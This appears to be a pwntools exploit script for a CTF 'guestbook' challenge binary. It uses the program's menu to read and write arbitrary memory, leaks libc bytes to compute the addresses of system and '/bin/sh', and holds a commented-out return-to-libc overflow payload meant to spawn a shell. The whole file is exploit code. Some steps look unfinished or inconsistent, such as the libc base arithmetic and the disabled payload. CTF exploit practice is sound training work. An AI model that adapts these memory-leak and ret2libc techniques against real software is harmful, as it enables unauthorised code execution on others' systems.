from pwn import *
import os

# Run process
context.arch = 'i386'
r = None
libc = ELF('/home/werew/TUCTF/mylibc')
target_addr = 0xf760b166


def set_addr(addr):
    global r
    r.sendline("2")
    r.sendline("6")
    r.sendline(pack(addr)+"\n")


def write(addr,value):
    global r
    set_addr(addr)
    r.sendline("2")
    r.sendline("0")
    r.sendline(value)

def read_byte(addr):
    set_addr(addr)
    r.sendline("1")
    r.clean()
    r.sendline("0")
    data = r.recvuntil("---------------------------")

    if data[0] == '\n':
        if data[1] == '\n':
            return '\n'
        else:
            return '\0'

    return data[0]


def leak_bytes():
    global target_addr
    content = ''

    for i in range(0,15):
        b = read_byte(target_addr+i)
        print("reading "+str(i)+" "+hex(u8(b)))
        content += b

    return content







while True:
    r = process(['/home/werew/TUCTF/guestbook'])
    pid = util.proc.pidof(r)[0]
    os.system("cat /proc/"+str(pid)+"/maps")

    pid = util.proc.pidof(r)[0]
    print "The pid is: "+str(pid)
    util.proc.wait_for_debugger(pid)
    
    r.sendline("AAAA")
    r.sendline("BBBB")
    r.sendline("CCCC")
    r.sendline("DDDD")

    try:
        g = libc.search(leak_bytes())
        leaked_addr = next(g)
        print(hex(leaked_addr))

        libc_base_addr = target_addr - leaked_addr
        system_addr = libc_base_addr + libc.symbols["system"]
        print(hex(system_addr))

        bin_sh = next(libc.search("/bin/sh"))
        print(hex(bin_sh))
        r.interactive()

        """
        r.sendline("2")
        r.sendline("0")
        r.clean()

        payload = 'A'*152 + pack(system_addr) + 'AAAA' +  pack(bin_sh)
        r.sendline(payload)

        r.sendline("3")
        r.interactive()
        """
        r.sendline("3")

    except Exception as e:
        print(e)
        print("FAIL")
        pass

    r.close()
    



